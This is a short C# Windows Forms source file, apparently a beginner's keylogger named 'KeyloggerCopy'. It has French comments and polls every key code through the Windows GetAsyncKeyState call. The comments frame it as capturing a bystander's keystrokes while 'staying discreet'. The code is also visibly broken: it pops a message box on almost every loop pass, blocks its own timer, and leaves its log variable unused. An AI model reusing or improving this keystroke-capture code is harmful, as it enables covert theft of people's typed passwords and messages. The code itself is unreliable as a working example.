using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;

namespace KeyloggerCopy
{
    public partial class Form1 : Form
    {  
        // variables du Keylogger
        [DllImport("user32.dll")] //Le DLL est nécessaire pour fonctionner
        public static extern int GetAsyncKeyState(Int32 i); //Permet d'obtenir l'état du clavier en temps réel
        static string logs = "";
        bool test=false;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
        int nbticks = 0;
        private void Tmr1_Tick(object sender, EventArgs e)
        {
            nbticks++;
        }

        private void BtnLancer_Click(object sender, EventArgs e)
        {
            test = !test;
            btnLancer.Text += "*";
            ecouter();
        }

        void ecouter()
        {
            while (nbticks<300)
            {
                Thread.Sleep(10); // On attend 10 ms pour éviter de consommer trop de ressources et rester discret
                for (byte i = 0; i < 255; i++) //on va boucler pour chaque caractère du clavier (on choisit byte car on va de 0 à 254 et la plage de byte va de 0 à 255)
                {
                    int keyState = GetAsyncKeyState(i); // On récupère l'état de touche à l'index i
                    if (keyState == 1 || keyState == -32767)
                    // keyState == -32767 (lol:p) renvoie True quand la touche d'index i est pressée 
                    // keyState == 1 renvoie True dans le cas éventuel et très peu probable que le quidam arrive à taper et retirer le doigt entre cette
                    // instruction et l'instruction précedente (enfin bon, sait-on jamais^^)
                    {
                        lbl1.Text += (Keys)i; // On stocke dans logs au fur et à mesure
                        MessageBox.Show(lbl1.Text + (Keys)i);
                        break; // Et on arrête la boucle
                    }
                    else
                    {
                        MessageBox.Show(" 2 "+ lbl1.Text + (Keys)i);
                    }
                }
            }
        }
    }
}
